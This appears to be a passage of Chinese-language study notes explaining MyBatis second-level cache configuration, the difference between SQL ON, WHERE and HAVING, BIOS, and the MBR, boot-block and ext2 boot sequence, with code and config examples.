<p>开关：需要配置 <code>&lt;cache&gt;</code>，并且实体类实现 <code>Serializable</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=N2E5ZDM1YmQ1MTEwZWQzNjM2NmE4ZmE1NzBlOWEyMjBfYjZIU09Hc0xKWDBOWEt4UzVuS0Vmb0dVQXIzdzBUUHhfVG9rZW46QzFISGJneU41b2ZzeWh4ekNlamNMSmR5bnFoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><strong>一级缓存是局部的、临时的；二级缓存是全局的、可复用的。</strong> 不配置二级缓存时，每次新建 SqlSession 都必须重新访问数据库。</p>
<h2 id="如何开启二级缓存">如何开启二级缓存</h2>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">src/</span><br><span class="line">├── mybatis-config.xml             # 全局配置</span><br><span class="line">├── mapper/</span><br><span class="line">│   └── UserMapper.xml            # Mapper XML</span><br><span class="line">├── User.java                     # 实体类</span><br><span class="line">├── UserMapper.java              # Mapper 接口</span><br><span class="line">├── MyBatisUtil.java             # 工具类</span><br><span class="line">└── MainTest.java                # 主测试类</span><br></pre></td></tr></table></figure>
<h2 id="✅-二、关键文件配置">✅ 二、关键文件配置</h2>
<h3 id="1-mybatis-config-xml（全局配置，开启二级缓存）">1. <code>mybatis-config.xml</code>（全局配置，开启二级缓存）</h3>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;cacheEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">typeAlias</span> <span class="attr">type</span>=<span class="string">&quot;com.example.User&quot;</span> <span class="attr">alias</span>=<span class="string">&quot;User&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;mapper/UserMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li><code>UserMapper.xml</code>（添加 <code>&lt;cache/&gt;</code> 标签启用二级缓存）</li>
</ol>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.example.UserMapper&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 开启当前 Mapper 的二级缓存 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cache</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserById&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;User&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span>&gt;</span></span><br><span class="line">        SELECT * FROM user WHERE id = #&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li><code>User.java</code>（注意：必须实现 Serializable）</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="comment">// getters/setters</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li><code>UserMapper.java</code></li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    User <span class="title function_">getUserById</span><span class="params">(<span class="type">int</span> id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="5">
<li><code>MyBatisUtil.java</code>（简化 SqlSession 获取）</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyBatisUtil</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SqlSessionFactory factory;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> Resources.getResourceAsStream(<span class="string">&quot;mybatis-config.xml&quot;</span>);</span><br><span class="line">            factory = <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(is);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SqlSession <span class="title function_">getSession</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> factory.openSession();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="6">
<li><code>MainTest.java</code>（对比二级缓存）</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSession;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 第一次查询，走数据库</span></span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">session1</span> <span class="operator">=</span> MyBatisUtil.getSession();</span><br><span class="line">        <span class="type">UserMapper</span> <span class="variable">mapper1</span> <span class="operator">=</span> session1.getMapper(UserMapper.class);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user1</span> <span class="operator">=</span> mapper1.getUserById(<span class="number">1</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;First Query: &quot;</span> + user1.getName());</span><br><span class="line">        session1.close(); <span class="comment">// 关闭 session 会将数据写入二级缓存</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第二次查询（新 session），命中二级缓存</span></span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">session2</span> <span class="operator">=</span> MyBatisUtil.getSession();</span><br><span class="line">        <span class="type">UserMapper</span> <span class="variable">mapper2</span> <span class="operator">=</span> session2.getMapper(UserMapper.class);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> mapper2.getUserById(<span class="number">1</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Second Query (from cache): &quot;</span> + user2.getName());</span><br><span class="line">        session2.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>📌 运行结果（假如 ID 为 1 的用户叫 Jack）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">First Query: Jack         ← 从数据库查询</span><br><span class="line">Second <span class="title function_">Query</span> <span class="params">(from cache)</span>: Jack ← 从二级缓存返回</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDY1YzBjOGNkNzY0MDJlOGFhNWZhOGJjZTE5YzA2YWFfTWFHeVZQZkRYaFdOc0txQzlCcTNkelRrMTh6NmV1bHpfVG9rZW46T1RiWWJEakIxbzNBMEZ4Vk9QUGNDb3EybnNjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="MyBatis-注解方式下如何启用和使用二级缓存">MyBatis 注解方式下如何启用和使用二级缓存</h2>
<h2 id="🔧-背景知识">🔧 背景知识</h2>
<p>在 MyBatis 中，<strong>一级缓存</strong>是基于 <code>SqlSession</code> 级别的，默认开启；而<strong>二级缓存</strong>是基于 <code>Mapper</code> 映射器级别的，需要手动开启。</p>
<p>当你使用 <strong>XML 写 SQL</strong> 时，可以直接在 <code>&lt;mapper&gt;</code> 中配置 <code>&lt;cache&gt;</code> 标签启用二级缓存。</p>
<p>但是如果你使用的是 <strong>注解方式写 SQL</strong>，需要通过注解来开启和配置缓存功能。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTFjMTEzY2EzOWEzZmU4N2Y3YWVlYjcwNTRjZGI0YThfRzFTaTNyaHJVVVkwZWU2aFlmeWJNY3EzNWlwa0RXeFRfVG9rZW46TEJNR2IwaWRjb3ZLcEd4aVgwUGNjdjZVblJiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-开启方式详解">✅ 开启方式详解</h2>
<ol>
<li>
<h3 id="开启二级缓存：-CacheNamespace">开启二级缓存：<code>@CacheNamespace</code></h3>
</li>
</ol>
<p>你可以在 Mapper 接口上使用这个注解：</p>
<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@CacheNamespace</span>(implementation=org.apache.ibatis.cache.impl.PerpetualCache.<span class="keyword">class</span>, eviction = LRUCache.<span class="keyword">class</span>) <span class="string">``</span><span class="keyword">public</span> <span class="keyword">interface</span> UserMapper &#123; <span class="string">``</span>    ... <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<p>但如果多个 Mapper 共用缓存（推荐用这个），使用：</p>
<h3 id="✅-推荐方式：-CacheNamespaceRef">✅ 推荐方式：<code>@CacheNamespaceRef</code></h3>
<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@CacheNamespaceRef</span>(UserMapper.<span class="keyword">class</span>) <span class="string">``</span><span class="keyword">public</span> <span class="keyword">interface</span> OrderMapper &#123; <span class="string">``</span>    ... <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<p>含义：</p>
<ul>
<li>表示当前 <code>OrderMapper</code> 使用 <code>UserMapper</code> 所指定的缓存空间（namespace）。</li>
<li>这样可以做到 <strong>多个 Mapper 共享一个缓存区域</strong>。</li>
</ul>
<h2 id="🔁-方法级别的配置：-Options">🔁 方法级别的配置：<code>@Options</code></h2>
<p>在某些情况下你不希望这个方法使用缓存（比如频繁变动的数据），就可以通过 <code>@Options</code> 控制：</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@Select</span>(<span class="string">&quot;SELECT * FROM user WHERE id = #&#123;id&#125;&quot;</span>) <span class="built_in">``</span><span class="variable">@Options</span>(<span class="built_in">``</span>useCache = false, flushCache = false<span class="built_in">``</span>)<span class="built_in">` `</span>User <span class="built_in">selectById</span>(int id);</span><br></pre></td></tr></table></figure>
<h2 id="📌-示例汇总">📌 示例汇总</h2>
<h3 id="✅-UserMapper-java">✅ UserMapper.java</h3>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@CacheNamespace</span>(implementation=org.apache.ibatis.cache.impl.PerpetualCache.class,eviction=org.apache.ibatis.cache.decorators.LruCache.class)</span><br><span class="line">public interface UserMapper &#123; ``    <span class="variable">@Select</span>(<span class="string">&quot;SELECT * FROM user WHERE id = #&#123;id&#125;&quot;</span>)<span class="built_in">` `</span>    User <span class="built_in">getUserById</span>(<span class="variable">@Param</span>(<span class="string">&quot;id&quot;</span>) int id); ``&#125;</span><br></pre></td></tr></table></figure>
<h3 id="✅-OrderMapper-java">✅ OrderMapper.java</h3>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@CacheNamespaceRef</span>(UserMapper.class) <span class="built_in">``</span>public interface OrderMapper &#123; ``    <span class="variable">@Select</span>(<span class="string">&quot;SELECT * FROM orders WHERE id = #&#123;id&#125;&quot;</span>) <span class="built_in">``</span>    <span class="variable">@Options</span>(useCache = true, flushCache = false)<span class="built_in">` `</span>    Order <span class="built_in">getOrderById</span>(<span class="variable">@Param</span>(<span class="string">&quot;id&quot;</span>) int id); ``&#125;</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTU3NTU5NjcxZTBhYzZmMjUzODUxMmY0Yjk3NGQ0YWFfR1prdUZ0QTVBZDlEbUllU2ZCcGxnRFRXd3dzWXdZV2FfVG9rZW46SEZBMmJiVU9Hb1hYTXp4VmkxeWM5SUhTbmtnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>mysql的on、where、having的区别</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWI0MmFkMDhhZDQwY2NkYzk1MDZmMmUxZDM4ODMxZDFfNmk0bngxZ0VWdk9XTVdMNm1jNHBWOXVKYWNKNDNPOFlfVG9rZW46SXFOb2JvTWVxb0h5N0x4ZUE5MWNHM0JNbmNoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><code>WHERE</code>、<code>HAVING</code>、<code>ON</code> 都用于 <strong>筛选数据</strong>，但它们所处的位置和作用的阶段不同，下面是三者的详细对比理解：</p>
<h3 id="✅-1-WHERE-——-作用于-原始数据（分组前）">✅ 1. <code>WHERE</code> —— 作用于 <strong>原始数据（分组前）</strong></h3>
<ul>
<li>在 <strong>数据分组（GROUP BY）或连接（JOIN）之前</strong> 就开始筛选。</li>
<li>不能用于聚合函数（如 <code>SUM()</code>、<code>COUNT()</code>）。</li>
</ul>
<p>📌 示例：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> orders<span class="symbol">` `</span><span class="keyword">WHERE</span> total_amount &gt; <span class="number">100</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>→ 筛选出订单金额大于 100 的记录。</p>
</blockquote>
<h3 id="✅-2-HAVING-——-作用于-分组后的聚合数据">✅ 2. <code>HAVING</code> —— 作用于 <strong>分组后的聚合数据</strong></h3>
<ul>
<li><strong>必须与 GROUP BY 连用</strong>；</li>
<li>用于对 <strong>聚合后的结果</strong> 进行筛选；</li>
<li>可以使用聚合函数（如 <code>SUM()</code>、<code>AVG()</code> 等）。</li>
</ul>
<p>📌 示例：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> customer_id, <span class="built_in">SUM</span>(total_amount) <span class="keyword">as</span> total<span class="symbol">` `</span><span class="keyword">FROM</span> orders<span class="symbol">` `</span><span class="keyword">GROUP</span> <span class="keyword">BY</span> customer_id<span class="symbol">` `</span><span class="keyword">HAVING</span> <span class="built_in">SUM</span>(total_amount) &gt; <span class="number">500</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>→ 筛选累计订单金额大于 500 的客户。</p>
</blockquote>
<h3 id="✅-3-ON-——-作用于-表连接时的行匹配条件">✅ 3. <code>ON</code> —— 作用于 <strong>表连接时的行匹配条件</strong></h3>
<ul>
<li>用于指定两个表连接（JOIN）时的条件；</li>
<li>只作用于 <strong>连接过程中的行配对</strong>，不涉及聚合。</li>
</ul>
<p>📌 示例：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="symbol">``</span><span class="keyword">FROM</span> orders o<span class="symbol">` `</span><span class="keyword">JOIN</span> customers c <span class="keyword">ON</span> o.customer_id = c.id;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>→ 使用 <code>ON</code> 指定连接的条件：订单表和客户表通过 <code>customer_id</code> 对应。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NTI1MmMyN2JhYWE4ZmIwMDhkYWQ0MzZkMjRiMWU5ZDdfQ3o0QVhKVHZNTEpqZWxEY2xCUmd0bDBMdm1sZW9nTkpfVG9rZW46TmVLVGJnUzVDb2l2MkJ4TzY1ZWNYem1pbk5jXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-正确理解：">✅ 正确理解：</h2>
<p><code>WHERE</code> 是在 <strong>连接完成后</strong> 对 <strong>整张临时结果表（连接结果）</strong> 进行过滤的。</p>
<h3 id="🔄-SQL-执行顺序（简化版）：">🔄 SQL 执行顺序（简化版）：</h3>
<ol>
<li><code>FROM</code>（包括 <code>JOIN</code>） → 先把多张表通过 <code>ON</code> 条件进行连接，生成临时表；</li>
<li><code>WHERE</code> → 再对这个 <strong>连接后的临时表</strong> 进行行筛选；</li>
<li><code>GROUP BY</code> → 然后开始分组；</li>
<li><code>HAVING</code> → 对分组后的聚合结果进行筛选；</li>
<li><code>SELECT</code> → 选择列；</li>
<li><code>ORDER BY</code> → 最后排序。</li>
</ol>
<h3 id="🔍-举个例子说明：">🔍 举个例子说明：</h3>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="symbol">``</span><span class="keyword">FROM</span> orders o<span class="symbol">` `</span><span class="keyword">JOIN</span> customers c <span class="keyword">ON</span> o.customer_id = c.id<span class="symbol">` `</span><span class="keyword">WHERE</span> c.region = <span class="string">&#x27;华南&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>ON</code> 是 <strong>连接条件</strong>：把 <code>orders</code> 和 <code>customers</code> 关联起来；</li>
<li><code>WHERE</code> 是 <strong>连接之后筛选</strong>：在连接结果中，只保留客户所在地区是“华南”的订单。</li>
</ul>
<h3 id="🧠-为什么有人说-WHERE-是“对原始数据”筛选？">🧠 为什么有人说 WHERE 是“对原始数据”筛选？</h3>
<p>这是因为在 <strong>没有 JOIN 的场景下</strong>，<code>WHERE</code> 确实是对表中原始数据筛选。但一旦有 <code>JOIN</code>，那就不是原始表，而是连接后的临时表了。</p>
<h3 id="✅-总结金句：">✅ 总结金句：</h3>
<blockquote>
<p>🔸 <code>ON</code> 是连接时筛选参与连接的行。 🔸 <code>WHERE</code> 是连接后，筛选结果集中的行。 🔸 <code>HAVING</code> 是分组后，筛选聚合结果的行。</p>
</blockquote>
<h1>BIOS</h1>
<p><code>BIOS</code> 是 <strong>Basic Input/Output System（基本输入输出系统）</strong> 的缩写，是计算机主板上的一段固化程序，是电脑开机后第一个运行的软件。</p>
<p>BIOS（Basic Input/Output System）是电脑主板上的一段固化程序，负责开机时进行硬件自检，并从硬盘等设备引导操作系统启动，是系统启动前的关键桥梁。</p>
<h3 id="✅-一句话解释：">✅ 一句话解释：</h3>
<blockquote>
<p><strong>BIOS 是电脑开机后加载操作系统之前，进行硬件初始化和检测的“引导程序”。</strong></p>
</blockquote>
<h3 id="🧠-BIOS-的主要作用：">🧠 BIOS 的主要作用：</h3>
<ol>
<li><strong>硬件自检（POST）</strong>：开机时检查 CPU、内存、显卡、硬盘是否正常；</li>
<li><strong>初始化硬件设备</strong>：加载主板、硬盘、USB、风扇等硬件的基本配置；</li>
<li><strong>引导加载操作系统</strong>：
<ol>
<li>从硬盘、U盘、光盘等读取操作系统启动项（如 Windows、Linux）；</li>
</ol>
</li>
<li><strong>提供 CMOS 设置界面</strong>（按 F2/Del 可进入）：
<ol>
<li>修改启动顺序、时间、CPU 频率、风扇转速等参数；</li>
</ol>
</li>
</ol>
<h3 id="🖼️-简单流程图（你可以在面试中口述）：">🖼️ 简单流程图（你可以在面试中口述）：</h3>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">电源启动 → <span class="keyword">BIOS </span>启动 → 硬件检测 → 加载启动设备 → 读取引导扇区 → 操作系统启动</span><br></pre></td></tr></table></figure>
<h1>文件系统</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MDc0Y2UxZWU1ZTIwNzY1ODNlMDY3YjMzNzk2NzhjNTdfWnY3ejFXUUdRaUVTMFZRY0FucWtsNXN6blNFTUVRZGNfVG9rZW46Ulp6QWJFaEJGb2J3Y0p4RGN1ZGNNWkZlbjRDXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🧭-一、MBR-与引导块的位置和作用">🧭 一、MBR 与引导块的位置和作用</h2>
<h3 id="✅-1-MBR（主引导记录，Master-Boot-Record）">✅ 1. <strong>MBR（主引导记录，Master Boot Record）</strong></h3>
<ul>
<li><strong>位置</strong>：整个硬盘的<strong>第一个扇区</strong>（LBA 0，偏移 0，大小为 512 字节）。</li>
<li><strong>内容结构</strong>：
<ul>
<li>前 446 字节：<strong>引导代码</strong>（会执行）</li>
<li>中间 64 字节：<strong>分区表</strong>（最多记录 4 个主分区）</li>
<li>后 2 字节：<strong>结束标志</strong> <code>0x55AA</code></li>
</ul>
</li>
<li><strong>作用</strong>：
<ul>
<li>由 BIOS 加载并执行</li>
<li>找到标记为“活动”的主分区</li>
<li>跳转到该分区的<strong>引导扇区</strong>（也称引导块）</li>
</ul>
</li>
</ul>
<h3 id="✅-2-引导块（Boot-Block-Volume-Boot-Record）">✅ 2. <strong>引导块（Boot Block / Volume Boot Record）</strong></h3>
<ul>
<li><strong>位置</strong>：分区的第一个扇区，即活动分区的起始扇区。</li>
<li><strong>内容</strong>：
<ul>
<li>存储了该分区的 boot loader 代码，比如 GRUB 的 stage1.5 或 stage2。</li>
</ul>
</li>
<li><strong>作用</strong>：
<ul>
<li>初始化运行环境</li>
<li>加载操作系统内核（如 Linux）</li>
<li>并将控制权交给内核</li>
</ul>
</li>
</ul>
<blockquote>
<p>⚠️ <strong>重要区分：</strong></p>
<ul>
<li><strong>MBR 是整个硬盘的开头</strong></li>
<li><strong>引导块是某个分区的开头</strong></li>
<li>它们都属于“引导阶段”，<strong>不是 ext2 文件系统结构的一部分</strong></li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">整个硬盘结构（例如 <span class="operator">/</span>dev<span class="operator">/</span>sda）：</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+------------------------+---------------------+</span></span><br><span class="line"><span class="operator">|</span>   MBR (<span class="number">512</span>B)   <span class="operator">|</span>   分区（如 <span class="operator">/</span>dev<span class="operator">/</span>sda1）  <span class="operator">|</span>   其它分区（可选）    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+------------------------+---------------------+</span></span><br><span class="line">                   <span class="operator">|</span></span><br><span class="line">                   └── 分区结构（如 ext2）:</span><br><span class="line">                       <span class="operator">+</span><span class="comment">------------------------+</span></span><br><span class="line">                       <span class="operator">|</span> 引导块（Boot Sector）  <span class="operator">|</span>  → boot loader</span><br><span class="line">                       <span class="operator">+</span><span class="comment">------------------------+</span></span><br><span class="line">                       <span class="operator">|</span> Super Block            <span class="operator">|</span>  → ext2 起点（偏移 <span class="number">1024</span> 字节）</span><br><span class="line">                       <span class="operator">+</span><span class="comment">------------------------+</span></span><br><span class="line">                       <span class="operator">|</span> Block <span class="keyword">Groups</span>           <span class="operator">|</span></span><br><span class="line">                       <span class="operator">|</span>   <span class="operator">-</span> <span class="keyword">Group</span> Descriptor   <span class="operator">|</span>      </span><br><span class="line">                       <span class="operator">|</span>   <span class="operator">-</span> Block bitmap       <span class="operator">|</span></span><br><span class="line">                       <span class="operator">|</span>   <span class="operator">-</span> Inode bitmap       <span class="operator">|</span></span><br><span class="line">                       <span class="operator">|</span>   <span class="operator">-</span> Inode <span class="keyword">table</span>        <span class="operator">|</span></span><br><span class="line">                       <span class="operator">|</span>   <span class="operator">-</span> Data blocks        <span class="operator">|</span></span><br><span class="line">                       <span class="operator">+</span><span class="comment">------------------------+</span></span><br></pre></td></tr></table></figure>
<h2 id="🧩-三、系统启动流程（结合硬盘和文件系统）">🧩 三、系统启动流程（结合硬盘和文件系统）</h2>
<ol>
<li><strong>BIOS 加载硬盘第一个扇区（MBR）</strong></li>
<li><strong>MBR 的代码</strong>找到活动分区，并跳转到该分区的 <strong>引导块（Boot Block）</strong></li>
<li>引导块中运行 boot loader（如 GRUB）</li>
<li>boot loader 加载 Linux 内核</li>
<li>Linux 内核挂载根文件系统（ext2/ext4）</li>
<li>内核读取 <strong>Super Block</strong>，根据 inode 查找 <code>/sbin/init</code></li>
<li>启动系统</li>
</ol>
<h4 id="可以把整个引导过程理解为接力赛跑：">可以把整个引导过程理解为接力赛跑：</h4>
<ol>
<li><strong>BIOS</strong> 把控制权交给 <strong>MBR 的 446 字节代码</strong>（第一个选手）</li>
<li>MBR 跳转到 <strong>引导块（boot sector）中的 boot loader</strong>（第二个选手）</li>
